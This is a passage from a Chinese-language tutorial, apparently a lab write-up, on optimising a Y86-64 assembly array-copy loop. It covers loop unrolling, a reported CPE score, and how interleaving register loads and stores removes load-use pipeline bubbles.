<span class=normal><a href=#__codelineno-108-55>55</a></span>
<span class=normal><a href=#__codelineno-108-56>56</a></span>
<span class=normal><a href=#__codelineno-108-57>57</a></span>
<span class=normal><a href=#__codelineno-108-58>58</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-108-1><a id=__codelineno-108-1 name=__codelineno-108-1></a><span class=c1># Loop header</span>
</span><span id=__span-108-2><a id=__codelineno-108-2 name=__codelineno-108-2></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdx</span><span class=p>,</span><span class=nv>%rdx</span><span class=w>      </span><span class=c1># len &lt;= 0?</span>
</span><span id=__span-108-3><a id=__codelineno-108-3 name=__codelineno-108-3></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>test</span>
</span><span id=__span-108-4><a id=__codelineno-108-4 name=__codelineno-108-4></a><span class=nl>Loop:</span><span class=na>...</span>
</span><span id=__span-108-5><a id=__codelineno-108-5 name=__codelineno-108-5></a><span class=nl>Loop1:</span><span class=na>...</span>
</span><span id=__span-108-6><a id=__codelineno-108-6 name=__codelineno-108-6></a><span class=na>...</span>
</span><span id=__span-108-7><a id=__codelineno-108-7 name=__codelineno-108-7></a><span class=nl>Loop4:</span><span class=na>...</span>
</span><span id=__span-108-8><a id=__codelineno-108-8 name=__codelineno-108-8></a><span class=nl>Loop5:</span><span class=na>...</span>
</span><span id=__span-108-9><a id=__codelineno-108-9 name=__codelineno-108-9></a><span class=nl>test:</span>
</span><span id=__span-108-10><a id=__codelineno-108-10 name=__codelineno-108-10></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$-6</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>         </span><span class=c1># 先减，判断够不够6个</span>
</span><span id=__span-108-11><a id=__codelineno-108-11 name=__codelineno-108-11></a><span class=w>    </span><span class=nf>jge</span><span class=w> </span><span class=no>Loop</span><span class=w>                </span><span class=c1># 6路展开</span>
</span><span id=__span-108-12><a id=__codelineno-108-12 name=__codelineno-108-12></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$6</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span>
</span><span id=__span-108-13><a id=__codelineno-108-13 name=__codelineno-108-13></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>test2</span><span class=w>               </span><span class=c1>#剩下的</span>
</span><span id=__span-108-14><a id=__codelineno-108-14 name=__codelineno-108-14></a>
</span><span id=__span-108-15><a id=__codelineno-108-15 name=__codelineno-108-15></a><span class=nl>L:</span>
</span><span id=__span-108-16><a id=__codelineno-108-16 name=__codelineno-108-16></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-108-17><a id=__codelineno-108-17 name=__codelineno-108-17></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-108-18><a id=__codelineno-108-18 name=__codelineno-108-18></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-108-19><a id=__codelineno-108-19 name=__codelineno-108-19></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>L1</span>
</span><span id=__span-108-20><a id=__codelineno-108-20 name=__codelineno-108-20></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-108-21><a id=__codelineno-108-21 name=__codelineno-108-21></a><span class=nl>L1:</span>
</span><span id=__span-108-22><a id=__codelineno-108-22 name=__codelineno-108-22></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-108-23><a id=__codelineno-108-23 name=__codelineno-108-23></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>8</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-108-24><a id=__codelineno-108-24 name=__codelineno-108-24></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-108-25><a id=__codelineno-108-25 name=__codelineno-108-25></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>L2</span>
</span><span id=__span-108-26><a id=__codelineno-108-26 name=__codelineno-108-26></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-108-27><a id=__codelineno-108-27 name=__codelineno-108-27></a><span class=nl>L2:</span>
</span><span id=__span-108-28><a id=__codelineno-108-28 name=__codelineno-108-28></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>16</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-108-29><a id=__codelineno-108-29 name=__codelineno-108-29></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>16</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-108-30><a id=__codelineno-108-30 name=__codelineno-108-30></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$24</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-108-31><a id=__codelineno-108-31 name=__codelineno-108-31></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$24</span><span class=p>,</span><span class=nv>%rsi</span>
</span><span id=__span-108-32><a id=__codelineno-108-32 name=__codelineno-108-32></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-108-33><a id=__codelineno-108-33 name=__codelineno-108-33></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>test2</span>
</span><span id=__span-108-34><a id=__codelineno-108-34 name=__codelineno-108-34></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-108-35><a id=__codelineno-108-35 name=__codelineno-108-35></a><span class=nl>test2:</span>
</span><span id=__span-108-36><a id=__codelineno-108-36 name=__codelineno-108-36></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$-3</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>         </span><span class=c1># 先减，判断够不够3个</span>
</span><span id=__span-108-37><a id=__codelineno-108-37 name=__codelineno-108-37></a><span class=w>    </span><span class=nf>jge</span><span class=w> </span><span class=no>L</span>
</span><span id=__span-108-38><a id=__codelineno-108-38 name=__codelineno-108-38></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$2</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>          </span><span class=c1># -1则不剩了，直接Done,0 剩一个, 1剩2个</span>
</span><span id=__span-108-39><a id=__codelineno-108-39 name=__codelineno-108-39></a><span class=w>    </span><span class=nf>je</span><span class=w> </span><span class=no>R0</span>
</span><span id=__span-108-40><a id=__codelineno-108-40 name=__codelineno-108-40></a><span class=w>    </span><span class=nf>jl</span><span class=w> </span><span class=no>Done</span>
</span><span id=__span-108-41><a id=__codelineno-108-41 name=__codelineno-108-41></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-108-42><a id=__codelineno-108-42 name=__codelineno-108-42></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-108-43><a id=__codelineno-108-43 name=__codelineno-108-43></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-108-44><a id=__codelineno-108-44 name=__codelineno-108-44></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>R2</span>
</span><span id=__span-108-45><a id=__codelineno-108-45 name=__codelineno-108-45></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-108-46><a id=__codelineno-108-46 name=__codelineno-108-46></a><span class=nl>R2:</span>
</span><span id=__span-108-47><a id=__codelineno-108-47 name=__codelineno-108-47></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-108-48><a id=__codelineno-108-48 name=__codelineno-108-48></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>8</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-108-49><a id=__codelineno-108-49 name=__codelineno-108-49></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-108-50><a id=__codelineno-108-50 name=__codelineno-108-50></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Done</span>
</span><span id=__span-108-51><a id=__codelineno-108-51 name=__codelineno-108-51></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-108-52><a id=__codelineno-108-52 name=__codelineno-108-52></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>Done</span>
</span><span id=__span-108-53><a id=__codelineno-108-53 name=__codelineno-108-53></a><span class=nl>R0:</span>
</span><span id=__span-108-54><a id=__codelineno-108-54 name=__codelineno-108-54></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-108-55><a id=__codelineno-108-55 name=__codelineno-108-55></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-108-56><a id=__codelineno-108-56 name=__codelineno-108-56></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-108-57><a id=__codelineno-108-57 name=__codelineno-108-57></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Done</span>
</span><span id=__span-108-58><a id=__codelineno-108-58 name=__codelineno-108-58></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span></code></pre></div></td></tr></table></div> <p>CPE 值为:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-109-1>1</a></span>
<span class=normal><a href=#__codelineno-109-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-109-1><a id=__codelineno-109-1 name=__codelineno-109-1></a>Average<span class=w> </span>CPE<span class=w>     </span><span class=m>9</span>.07
</span><span id=__span-109-2><a id=__codelineno-109-2 name=__codelineno-109-2></a>Score<span class=w>   </span><span class=m>28</span>.5/60.0
</span></code></pre></div></td></tr></table></div> <h4 id=_4>消除气泡<a class=headerlink href=#_4 title="Permanent link">¶</a></h4> <p>注意，程序多次使用了下面的操作：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-110-1>1</a></span>
<span class=normal><a href=#__codelineno-110-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-110-1><a id=__codelineno-110-1 name=__codelineno-110-1></a><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%r8</span>
</span><span id=__span-110-2><a id=__codelineno-110-2 name=__codelineno-110-2></a><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span></code></pre></div></td></tr></table></div> <p>Y86-64处理器的流水线有 F(取指)、D(译码)、E(执行)、M(访存)、W(写回) 五个阶段，其中D(译码)是读取寄存器，E(执行)是ALU计算，M(访存)是读取对应内存值，W(写回)是将结果写回寄存器。D 阶段才读取寄存器，M 阶段才读取对应内存值，即使使用转发来避免数据冒险，这其中也至少会有一个气泡。像这样:</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-111-1>1</a></span>
<span class=normal><a href=#__codelineno-111-2>2</a></span>
<span class=normal><a href=#__codelineno-111-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-111-1><a id=__codelineno-111-1 name=__codelineno-111-1></a><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%r8</span>
</span><span id=__span-111-2><a id=__codelineno-111-2 name=__codelineno-111-2></a><span class=nf>bubble</span>
</span><span id=__span-111-3><a id=__codelineno-111-3 name=__codelineno-111-3></a><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span></code></pre></div></td></tr></table></div> <p>一个优化办法是，多取一个寄存器，连续进行两次数据复制:</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-112-1>1</a></span>
<span class=normal><a href=#__codelineno-112-2>2</a></span>
<span class=normal><a href=#__codelineno-112-3>3</a></span>
<span class=normal><a href=#__codelineno-112-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-112-1><a id=__codelineno-112-1 name=__codelineno-112-1></a><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%r8</span>
</span><span id=__span-112-2><a id=__codelineno-112-2 name=__codelineno-112-2></a><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%r9</span>
</span><span id=__span-112-3><a id=__codelineno-112-3 name=__codelineno-112-3></a><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-112-4><a id=__codelineno-112-4 name=__codelineno-112-4></a><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span></code></pre></div></td></tr></table></div> <p>像这样，对<code>%r8</code>和<code>%r9</code>进行读入和读出的操作之间都隔着一条其他指令，就不会有气泡产生了。代码如下：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-113-1> 1</a></span>
<span class=normal><a href=#__codelineno-113-2> 2</a></span>
<span class=normal><a href=#__codelineno-113-3> 3</a></span>
<span class=normal><a href=#__codelineno-113-4> 4</a></span>
<span class=normal><a href=#__codelineno-113-5> 5</a></span>
<span class=normal><a href=#__codelineno-113-6> 6</a></span>
<span class=normal><a href=#__codelineno-113-7> 7</a></span>
<span class=normal><a href=#__codelineno-113-8> 8</a></span>
<span class=normal><a href=#__codelineno-113-9> 9</a></span>
<span class=normal><a href=#__codelineno-113-10>10</a></span>
<span class=normal><a href=#__codelineno-113-11>11</a></span>
<span class=normal><a href=#__codelineno-113-12>12</a></span>
<span class=normal><a href=#__codelineno-113-13>13</a></span>
<span class=normal><a href=#__codelineno-113-14>14</a></span>
<span class=normal><a href=#__codelineno-113-15>15</a></span>
<span class=normal><a href=#__codelineno-113-16>16</a></span>
<span class=normal><a href=#__codelineno-113-17>17</a></span>
<span class=normal><a href=#__codelineno-113-18>18</a></span>
<span class=normal><a href=#__codelineno-113-19>19</a></span>
<span class=normal><a href=#__codelineno-113-20>20</a></span>
<span class=normal><a href=#__codelineno-113-21>21</a></span>
<span class=normal><a href=#__codelineno-113-22>22</a></span>
<span class=normal><a href=#__codelineno-113-23>23</a></span>
<span class=normal><a href=#__codelineno-113-24>24</a></span>
<span class=normal><a href=#__codelineno-113-25>25</a></span>
<span class=normal><a href=#__codelineno-113-26>26</a></span>
<span class=normal><a href=#__codelineno-113-27>27</a></span>
<span class=normal><a href=#__codelineno-113-28>28</a></span>
<span class=normal><a href=#__codelineno-113-29>29</a></span>
<span class=normal><a href=#__codelineno-113-30>30</a></span>
<span class=normal><a href=#__codelineno-113-31>31</a></span>
<span class=normal><a href=#__codelineno-113-32>32</a></span>
<span class=normal><a href=#__codelineno-113-33>33</a></span>
<span class=normal><a href=#__codelineno-113-34>34</a></span>
<span class=normal><a href=#__codelineno-113-35>35</a></span>
<span class=normal><a href=#__codelineno-113-36>36</a></span>
<span class=normal><a href=#__codelineno-113-37>37</a></span>
<span class=normal><a href=#__codelineno-113-38>38</a></span>
<span class=normal><a href=#__codelineno-113-39>39</a></span>
<span class=normal><a href=#__codelineno-113-40>40</a></span>
<span class=normal><a href=#__codelineno-113-41>41</a></span>
<span class=normal><a href=#__codelineno-113-42>42</a></span>
<span class=normal><a href=#__codelineno-113-43>43</a></span>
<span class=normal><a href=#__codelineno-113-44>44</a></span>
<span class=normal><a href=#__codelineno-113-45>45</a></span>
<span class=normal><a href=#__codelineno-113-46>46</a></span>
<span class=normal><a href=#__codelineno-113-47>47</a></span>
<span class=normal><a href=#__codelineno-113-48>48</a></span>
<span class=normal><a href=#__codelineno-113-49>49</a></span>
<span class=normal><a href=#__codelineno-113-50>50</a></span>
<span class=normal><a href=#__codelineno-113-51>51</a></span>
<span class=normal><a href=#__codelineno-113-52>52</a></span>
<span class=normal><a href=#__codelineno-113-53>53</a></span>
<span class=normal><a href=#__codelineno-113-54>54</a></span>
<span class=normal><a href=#__codelineno-113-55>55</a></span>
<span class=normal><a href=#__codelineno-113-56>56</a></span>
<span class=normal><a href=#__codelineno-113-57>57</a></span>
<span class=normal><a href=#__codelineno-113-58>58</a></span>
<span class=normal><a href=#__codelineno-113-59>59</a></span>
<span class=normal><a href=#__codelineno-113-60>60</a></span>
<span class=normal><a href=#__codelineno-113-61>61</a></span>
<span class=normal><a href=#__codelineno-113-62>62</a></span>
<span class=normal><a href=#__codelineno-113-63>63</a></span>
<span class=normal><a href=#__codelineno-113-64>64</a></span>
<span class=normal><a href=#__codelineno-113-65>65</a></span>
<span class=normal><a href=#__codelineno-113-66>66</a></span>
<span class=normal><a href=#__codelineno-113-67>67</a></span>
<span class=normal><a href=#__codelineno-113-68>68</a></span>
<span class=normal><a href=#__codelineno-113-69>69</a></span>
<span class=normal><a href=#__codelineno-113-70>70</a></span>
<span class=normal><a href=#__codelineno-113-71>71</a></span>
<span class=normal><a href=#__codelineno-113-72>72</a></span>
<span class=normal><a href=#__codelineno-113-73>73</a></span>
<span class=normal><a href=#__codelineno-113-74>74</a></span>
<span class=normal><a href=#__codelineno-113-75>75</a></span>
<span class=normal><a href=#__codelineno-113-76>76</a></span>
<span class=normal><a href=#__codelineno-113-77>77</a></span>
<span class=normal><a href=#__codelineno-113-78>78</a></span>
<span class=normal><a href=#__codelineno-113-79>79</a></span>
<span class=normal><a href=#__codelineno-113-80>80</a></span>
<span class=normal><a href=#__codelineno-113-81>81</a></span>
<span class=normal><a href=#__codelineno-113-82>82</a></span>
<span class=normal><a href=#__codelineno-113-83>83</a></span>
<span class=normal><a href=#__codelineno-113-84>84</a></span>
<span class=normal><a href=#__codelineno-113-85>85</a></span>
<span class=normal><a href=#__codelineno-113-86>86</a></span>
<span class=normal><a href=#__codelineno-113-87>87</a></span>
<span class=normal><a href=#__codelineno-113-88>88</a></span>
<span class=normal><a href=#__codelineno-113-89>89</a></span>
<span class=normal><a href=#__codelineno-113-90>90</a></span>
<span class=normal><a href=#__codelineno-113-91>91</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-113-1><a id=__codelineno-113-1 name=__codelineno-113-1></a><span class=c1># Loop header</span>
</span><span id=__span-113-2><a id=__codelineno-113-2 name=__codelineno-113-2></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdx</span><span class=p>,</span><span class=nv>%rdx</span><span class=w>      </span><span class=c1># len &lt;= 0?</span>
</span><span id=__span-113-3><a id=__codelineno-113-3 name=__codelineno-113-3></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>test</span>
</span><span id=__span-113-4><a id=__codelineno-113-4 name=__codelineno-113-4></a><span class=nl>Loop:</span>
</span><span id=__span-113-5><a id=__codelineno-113-5 name=__codelineno-113-5></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-113-6><a id=__codelineno-113-6 name=__codelineno-113-6></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r9</span>
</span><span id=__span-113-7><a id=__codelineno-113-7 name=__codelineno-113-7></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-113-8><a id=__codelineno-113-8 name=__codelineno-113-8></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-9><a id=__codelineno-113-9 name=__codelineno-113-9></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=mi>8</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-10><a id=__codelineno-113-10 name=__codelineno-113-10></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop1</span>
</span><span id=__span-113-11><a id=__codelineno-113-11 name=__codelineno-113-11></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-12><a id=__codelineno-113-12 name=__codelineno-113-12></a><span class=nl>Loop1:</span><span class=w>  </span>
</span><span id=__span-113-13><a id=__codelineno-113-13 name=__codelineno-113-13></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=nv>%r9</span>
</span><span id=__span-113-14><a id=__codelineno-113-14 name=__codelineno-113-14></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop2</span>
</span><span id=__span-113-15><a id=__codelineno-113-15 name=__codelineno-113-15></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-16><a id=__codelineno-113-16 name=__codelineno-113-16></a><span class=nl>Loop2:</span>
</span><span id=__span-113-17><a id=__codelineno-113-17 name=__codelineno-113-17></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>16</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-113-18><a id=__codelineno-113-18 name=__codelineno-113-18></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>24</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r9</span>
</span><span id=__span-113-19><a id=__codelineno-113-19 name=__codelineno-113-19></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-113-20><a id=__codelineno-113-20 name=__codelineno-113-20></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>16</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-21><a id=__codelineno-113-21 name=__codelineno-113-21></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=mi>24</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-22><a id=__codelineno-113-22 name=__codelineno-113-22></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop3</span>
</span><span id=__span-113-23><a id=__codelineno-113-23 name=__codelineno-113-23></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-24><a id=__codelineno-113-24 name=__codelineno-113-24></a><span class=nl>Loop3:</span><span class=w>  </span>
</span><span id=__span-113-25><a id=__codelineno-113-25 name=__codelineno-113-25></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=nv>%r9</span>
</span><span id=__span-113-26><a id=__codelineno-113-26 name=__codelineno-113-26></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop4</span>
</span><span id=__span-113-27><a id=__codelineno-113-27 name=__codelineno-113-27></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-28><a id=__codelineno-113-28 name=__codelineno-113-28></a><span class=nl>Loop4:</span>
</span><span id=__span-113-29><a id=__codelineno-113-29 name=__codelineno-113-29></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>32</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-113-30><a id=__codelineno-113-30 name=__codelineno-113-30></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>40</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r9</span>
</span><span id=__span-113-31><a id=__codelineno-113-31 name=__codelineno-113-31></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-113-32><a id=__codelineno-113-32 name=__codelineno-113-32></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>32</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-33><a id=__codelineno-113-33 name=__codelineno-113-33></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=mi>40</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-34><a id=__codelineno-113-34 name=__codelineno-113-34></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop5</span>
</span><span id=__span-113-35><a id=__codelineno-113-35 name=__codelineno-113-35></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-36><a id=__codelineno-113-36 name=__codelineno-113-36></a><span class=nl>Loop5:</span>
</span><span id=__span-113-37><a id=__codelineno-113-37 name=__codelineno-113-37></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$48</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-113-38><a id=__codelineno-113-38 name=__codelineno-113-38></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$48</span><span class=p>,</span><span class=nv>%rsi</span><span class=w>      </span>
</span><span id=__span-113-39><a id=__codelineno-113-39 name=__codelineno-113-39></a><span class=w>    </span><span class=no>andq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=nv>%r9</span>
</span><span id=__span-113-40><a id=__codelineno-113-40 name=__codelineno-113-40></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>test</span>
</span><span id=__span-113-41><a id=__codelineno-113-41 name=__codelineno-113-41></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-42><a id=__codelineno-113-42 name=__codelineno-113-42></a><span class=nl>test:</span>
</span><span id=__span-113-43><a id=__codelineno-113-43 name=__codelineno-113-43></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$-6</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>         </span><span class=c1># 先减，判断够不够6个</span>
</span><span id=__span-113-44><a id=__codelineno-113-44 name=__codelineno-113-44></a><span class=w>    </span><span class=nf>jge</span><span class=w> </span><span class=no>Loop</span><span class=w>                </span><span class=c1># 6路展开</span>
</span><span id=__span-113-45><a id=__codelineno-113-45 name=__codelineno-113-45></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$6</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span>
</span><span id=__span-113-46><a id=__codelineno-113-46 name=__codelineno-113-46></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>test2</span><span class=w>               </span><span class=c1>#剩下的</span>
</span><span id=__span-113-47><a id=__codelineno-113-47 name=__codelineno-113-47></a>
